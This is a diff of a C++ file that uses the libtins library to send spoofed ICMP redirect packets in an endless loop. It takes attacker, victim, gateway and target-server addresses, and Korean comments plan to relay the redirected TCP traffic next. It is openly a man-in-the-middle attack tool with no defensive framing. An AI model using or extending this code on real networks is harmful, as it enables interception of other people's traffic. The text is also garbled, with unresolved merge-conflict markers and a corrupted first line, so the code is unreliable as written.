@@ -1,11 +1,18 @@
+<<<<<<< HEAD
 癤�#define TINS_STATIC
+=======
+#define TINS_STATIC
+>>>>>>> d589ddcbf609d1767dd71b3cd2d97f037efe1c73
 #include <tins/tins.h>
 #include <iostream>
 #include <string>
 #include <stdexcept>
 #include <cstdlib>
 #include <string>
+<<<<<<< HEAD
 #include <thread>
+=======
+>>>>>>> d589ddcbf609d1767dd71b3cd2d97f037efe1c73
 #ifdef _WIN32
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -18,7 +25,17 @@ using std::cout;
 using std::runtime_error;
 using std::endl;
 
+<<<<<<< HEAD
 void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address webip, const NetworkInterface::Info& info)
+=======
+
+//다음 진행 : relay
+//윈도우 7이상은 라우터 테이블에 리다이렉트 경로를 따로 지정하지 않음으로 계속적으로 보내주어야 한다.
+//TCP 가 오면 그 패킷을 relay 시켜주는 작업진행
+
+
+void icmp_redirect(NetworkInterface iface,IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address webip,const NetworkInterface::Info& info)
+>>>>>>> d589ddcbf609d1767dd71b3cd2d97f037efe1c73
 {
 	PacketSender sender;
 	EthernetII::address_type attack_hw, victim_hw;
@@ -28,11 +45,20 @@ void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, I
 	cout << " Using own hw address:     " << info.hw_addr << "\n";
 	ICMP icmp;
 	icmp.set_redirect(1, (IPv4Address)htonl(attack));
+<<<<<<< HEAD
 	uint8_t *data;
 	data = (uint8_t *)malloc(8);
 	memset(data, NULL, 8);
 	EthernetII do_icmp = EthernetII(victim_hw, attack_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);
 
+=======
+	cout << icmp.gateway() << endl;
+	uint8_t *a;
+	a =(uint8_t *)malloc(8);
+	memset(a, NULL,8);	
+	EthernetII do_icmp = EthernetII(victim_hw, attack_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(a, 8);
+	
+>>>>>>> d589ddcbf609d1767dd71b3cd2d97f037efe1c73
 	while (true) {
 		sender.send(do_icmp, iface);
 #ifdef _WIN32
